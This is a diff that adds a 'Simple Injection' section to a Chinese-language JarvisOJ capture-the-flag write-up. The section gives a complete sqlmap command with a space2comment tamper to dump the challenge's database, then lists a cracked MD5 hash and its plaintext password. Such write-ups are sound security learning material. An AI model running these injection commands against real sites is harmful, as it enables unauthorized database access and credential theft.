@@ -234,3 +234,14 @@ for i in xrange(1000):
 ```
 
 - 得到 flag ![easygallery](https://github.com/Chris-Ju/Picture/blob/master/JarvisOJ-EasyGallery-6.png?raw=true)
+
+## Simple Injection
+
+- 直接 sqlmap 跑  
+
+```shell
+python sqlmap.py -u http://web.jarvisoj.com:32787/login.php --data="username=admin&password=admin" --tamper=space2comment -D injection --dump
+```
+
+- 得到后 md5 解密 334cfb59c9d74849801d5acdcfdaadc3 -> eTAloCrEP
+- ![simpleinjection](https://github.com/Chris-Ju/Picture/blob/master/JarvisOJ-SimpleInjection.png?raw=true)
